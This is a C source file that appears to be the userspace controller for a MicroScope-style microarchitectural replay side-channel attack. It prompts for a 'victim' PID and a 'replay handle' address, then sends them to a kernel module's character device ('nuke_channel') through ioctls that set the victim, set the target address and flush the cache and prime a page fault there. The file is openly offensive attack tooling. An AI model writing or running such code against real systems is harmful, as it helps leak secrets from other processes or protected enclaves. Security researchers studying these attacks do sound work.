#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include "microscope_mod.h"

#define DEVICE_PATH "../nuke_channel"

int main() {
    pid_t victim_pid;
    uint64_t replay_handle;

    printf("Caller: Enter victim's PID...\n");
    scanf("%u", &victim_pid);
    char pid_buf[20];
    sprintf(pid_buf, "0x%x\n", victim_pid); 
    printf("PID: %s\n", pid_buf);

    printf("Caller: Enter victim's replay handle...\n");
    scanf("%lx", &replay_handle);
    char va_buf[20];
    sprintf(va_buf, "0x%lx\n", replay_handle); 
    printf("Address: %s\n", va_buf);

    // open the char device of the microscope module
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd == -1) {
        printf("Open Device Error: %d\n", errno);
        exit(EXIT_FAILURE);
    }

    // tell the char device victim's PID 
    int result = ioctl(fd, IOCTL_SET_VICTIM_PID, pid_buf);
    if (result == -1) {
        printf("VICTIM_PID Error: %d\n", errno);
        exit(EXIT_FAILURE);
    }

    // tell the char device this is the replay handle 
    result = ioctl(fd, IOCTL_SET_NUKE_ADDR, va_buf);
    if (result == -1) {
        printf("NUKE_ADDR Error: %d\n", errno);
        exit(EXIT_FAILURE);
    }

    // flush cache at the replay handle
    result = ioctl(fd, IOCTL_PREP_PF);
    if (result == -1) {
        printf("PF Error: %d\n", errno);
        exit(EXIT_FAILURE);
    }
    return 0;
}

